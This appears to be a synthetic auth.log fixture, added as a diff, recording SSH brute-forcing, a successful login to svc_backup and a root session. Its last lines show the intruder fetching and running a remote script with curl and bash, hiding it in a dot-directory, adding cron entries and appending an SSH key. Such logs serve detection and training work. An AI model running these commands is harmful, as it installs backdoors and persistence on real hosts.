@@ -1,0 +1,76 @@
+Feb 19 01:29:44 srv01 sudo:      ops : TTY=pts/1 ; PWD=/home/ops ; USER=root ; COMMAND=/usr/bin/systemctl restart ssh
+Feb 19 01:29:44 srv01 sudo: pam_unix(sudo:session): session opened for user root by ops(uid=0)
+Feb 19 01:29:44 srv01 sudo: pam_unix(sudo:session): session closed for user root
+Feb 19 01:31:02 srv01 sshd[1988]: Accepted publickey for svc_backup from 10.10.60.21 port 50122 ssh2: RSA SHA256:K9s1uYQHq3oB2mYQwZpP5a9rX2H8fR2+uG0s8l9pA7s
+Feb 19 01:31:02 srv01 sshd[1988]: pam_unix(sshd:session): session opened for user svc_backup by (uid=0)
+Feb 19 01:33:19 srv01 sshd[1988]: pam_unix(sshd:session): session closed for user svc_backup
+Feb 19 01:39:08 srv01 sshd[2321]: Connection closed by 198.51.100.44 port 50992 [preauth]
+Feb 19 01:39:55 srv01 sshd[2350]: Invalid user oracle from 198.51.100.44 port 51021
+Feb 19 01:39:55 srv01 sshd[2350]: pam_unix(sshd:auth): check pass; user unknown
+Feb 19 01:39:56 srv01 sshd[2350]: Failed password for invalid user oracle from 198.51.100.44 port 51021 ssh2
+Feb 19 01:40:01 srv01 sshd[2351]: Invalid user test from 198.51.100.44 port 51022
+Feb 19 01:40:02 srv01 sshd[2351]: Failed password for invalid user test from 198.51.100.44 port 51022 ssh2
+Feb 19 01:40:06 srv01 sshd[2352]: Failed password for root from 198.51.100.44 port 51023 ssh2
+Feb 19 01:40:12 srv01 sshd[2353]: Failed password for ubuntu from 198.51.100.44 port 51024 ssh2
+Feb 19 01:41:26 srv01 sshd[2401]: Received disconnect from 198.51.100.44 port 51024:11: Bye Bye [preauth]
+Feb 19 02:01:53 srv01 sshd[2791]: Connection reset by 203.0.113.77 port 51740 [preauth]
+Feb 19 02:03:10 srv01 sshd[3000]: Failed password for invalid user root from 185.100.87.12 port 42000 ssh2
+Feb 19 02:03:11 srv01 sshd[3001]: Failed password for invalid user admin from 185.100.87.12 port 42001 ssh2
+Feb 19 02:03:12 srv01 sshd[3002]: Failed password for invalid user test from 185.100.87.12 port 42002 ssh2
+Feb 19 02:03:13 srv01 sshd[3003]: Failed password for invalid user oracle from 185.100.87.12 port 42003 ssh2
+Feb 19 02:03:14 srv01 sshd[3004]: Failed password for invalid user git from 185.100.87.12 port 42004 ssh2
+Feb 19 02:03:15 srv01 sshd[3005]: Failed password for invalid user deploy from 185.100.87.12 port 42005 ssh2
+Feb 19 02:03:16 srv01 sshd[3006]: Failed password for invalid user ubuntu from 185.100.87.12 port 42006 ssh2
+Feb 19 02:03:17 srv01 sshd[3007]: Failed password for invalid user postgres from 185.100.87.12 port 42007 ssh2
+Feb 19 02:03:18 srv01 sshd[3008]: Failed password for invalid user backup from 185.100.87.12 port 42008 ssh2
+Feb 19 02:03:19 srv01 sshd[3009]: Failed password for invalid user ftp from 185.100.87.12 port 42009 ssh2
+Feb 19 02:03:20 srv01 sshd[3010]: Failed password for invalid user nagios from 185.100.87.12 port 42010 ssh2
+Feb 19 02:03:21 srv01 sshd[3011]: Failed password for invalid user pi from 185.100.87.12 port 42011 ssh2
+Feb 19 02:03:22 srv01 sshd[3012]: Failed password for invalid user root from 185.100.87.12 port 42012 ssh2
+Feb 19 02:03:23 srv01 sshd[3013]: Failed password for invalid user admin from 185.100.87.12 port 42013 ssh2
+Feb 19 02:03:24 srv01 sshd[3014]: Failed password for invalid user test from 185.100.87.12 port 42014 ssh2
+Feb 19 02:03:25 srv01 sshd[3015]: Failed password for invalid user oracle from 185.100.87.12 port 42015 ssh2
+Feb 19 02:03:26 srv01 sshd[3016]: Failed password for invalid user git from 185.100.87.12 port 42016 ssh2
+Feb 19 02:03:27 srv01 sshd[3017]: Failed password for invalid user deploy from 185.100.87.12 port 42017 ssh2
+Feb 19 02:03:28 srv01 sshd[3018]: Failed password for invalid user ubuntu from 185.100.87.12 port 42018 ssh2
+Feb 19 02:03:29 srv01 sshd[3019]: Failed password for invalid user postgres from 185.100.87.12 port 42019 ssh2
+Feb 19 02:03:30 srv01 sshd[3020]: Failed password for invalid user backup from 185.100.87.12 port 42020 ssh2
+Feb 19 02:03:31 srv01 sshd[3021]: Failed password for invalid user ftp from 185.100.87.12 port 42021 ssh2
+Feb 19 02:03:32 srv01 sshd[3022]: Failed password for invalid user nagios from 185.100.87.12 port 42022 ssh2
+Feb 19 02:03:33 srv01 sshd[3023]: Failed password for invalid user pi from 185.100.87.12 port 42023 ssh2
+Feb 19 02:03:34 srv01 sshd[3024]: Failed password for invalid user root from 185.100.87.12 port 42024 ssh2
+Feb 19 02:03:35 srv01 sshd[3025]: Failed password for invalid user admin from 185.100.87.12 port 42025 ssh2
+Feb 19 02:04:02 srv01 sshd[3060]: Failed password for root from 203.0.113.77 port 52000 ssh2
+Feb 19 02:04:05 srv01 sshd[3061]: Failed password for oracle from 203.0.113.77 port 52001 ssh2
+Feb 19 02:04:08 srv01 sshd[3062]: Failed password for ubuntu from 203.0.113.77 port 52002 ssh2
+Feb 19 02:04:11 srv01 sshd[3063]: Failed password for ftp from 203.0.113.77 port 52003 ssh2
+Feb 19 02:07:44 srv01 sshd[3201]: error: kex_exchange_identification: Connection closed by remote host
+Feb 19 02:07:44 srv01 sshd[3201]: Connection closed by 185.100.87.12 port 42661 [preauth]
+Feb 19 02:10:20 srv01 sshd[3600]: Failed password for svc_backup from 185.100.87.12 port 43000 ssh2
+Feb 19 02:10:21 srv01 sshd[3601]: Failed password for ops from 185.100.87.12 port 43001 ssh2
+Feb 19 02:10:22 srv01 sshd[3602]: Failed password for debian from 185.100.87.12 port 43002 ssh2
+Feb 19 02:10:23 srv01 sshd[3603]: Failed password for www-data from 185.100.87.12 port 43003 ssh2
+Feb 19 02:10:24 srv01 sshd[3604]: Failed password for svc_backup from 185.100.87.12 port 43004 ssh2
+Feb 19 02:10:25 srv01 sshd[3605]: Failed password for ops from 185.100.87.12 port 43005 ssh2
+Feb 19 02:10:26 srv01 sshd[3606]: Failed password for debian from 185.100.87.12 port 43006 ssh2
+Feb 19 02:10:27 srv01 sshd[3607]: Failed password for www-data from 185.100.87.12 port 43007 ssh2
+Feb 19 02:11:03 srv01 sshd[3720]: Accepted password for ops from 10.10.60.21 port 50401 ssh2
+Feb 19 02:11:03 srv01 sshd[3720]: pam_unix(sshd:session): session opened for user ops by (uid=0)
+Feb 19 02:11:37 srv01 sshd[3720]: pam_unix(sshd:session): session closed for user ops
+Feb 19 02:14:07 srv01 sshd[3891]: Accepted password for svc_backup from 185.100.87.12 port 51244 ssh2
+Feb 19 02:14:07 srv01 sshd[3891]: pam_unix(sshd:session): session opened for user svc_backup by (uid=0)
+Feb 19 02:14:14 srv01 sshd[3891]: pam_env(sshd:session): deprecated reading of user environment enabled
+Feb 19 02:15:12 srv01 sudo: svc_backup : TTY=pts/0 ; PWD=/home/svc_backup ; USER=root ; COMMAND=/usr/bin/sudo -l
+Feb 19 02:15:20 srv01 sudo: svc_backup : TTY=pts/0 ; PWD=/home/svc_backup ; USER=root ; COMMAND=/usr/bin/id
+Feb 19 02:15:33 srv01 sudo: svc_backup : TTY=pts/0 ; PWD=/home/svc_backup ; USER=root ; COMMAND=/bin/bash
+Feb 19 02:15:33 srv01 sudo: pam_unix(sudo:session): session opened for user root by svc_backup(uid=0)
+Feb 19 02:16:02 srv01 sudo: root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/mkdir -p /usr/local/bin/.sys
+Feb 19 02:16:19 srv01 sudo: root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/curl -fsSL http://198.51.100.23/.cache/patch.sh -o /tmp/.upd
+Feb 19 02:16:27 srv01 sudo: root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/bin/bash /tmp/.upd
+Feb 19 02:17:03 srv01 sudo: root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/install -m 755 /tmp/.upd /usr/local/bin/.sys/update.sh
+Feb 19 02:17:22 srv01 sudo: root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/tee /etc/cron.d/sysstat
+Feb 19 02:17:47 srv01 sudo: root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/tee /etc/cron.d/.sys-update
+Feb 19 02:18:13 srv01 sudo: root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/chmod 644 /etc/cron.d/.sys-update
+Feb 19 02:18:41 srv01 sudo: root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/tee -a /root/.ssh/authorized_keys
+Feb 19 02:20:01 srv01 sudo: pam_unix(sudo:session): session closed for user root
+Feb 19 02:21:09 srv01 sshd[3891]: pam_unix(sshd:session): session closed for user svc_backup
